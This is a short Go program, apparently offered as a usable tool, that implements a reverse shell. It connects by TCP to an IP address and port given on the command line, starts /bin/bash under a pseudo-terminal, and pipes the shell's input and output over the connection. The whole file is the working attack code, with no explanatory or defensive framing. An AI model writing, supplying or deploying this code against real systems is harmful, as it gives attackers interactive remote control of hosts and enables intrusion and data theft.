package main

import (
	"io"
	"net"
	"os"
	"os/exec"

	"github.com/creack/pty"
)

func main() {
	if len(os.Args) != 3 {
		println("Usage: ./script IP PORT")
		return
	}

	target := os.Args[1] + ":" + os.Args[2]
	conn, err := net.Dial("tcp", target)
	if err != nil {
		return
	}
	defer conn.Close()

	cmd := exec.Command("/bin/bash")
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return
	}
	defer ptmx.Close()

	go io.Copy(conn, ptmx)
	io.Copy(ptmx, conn)
}

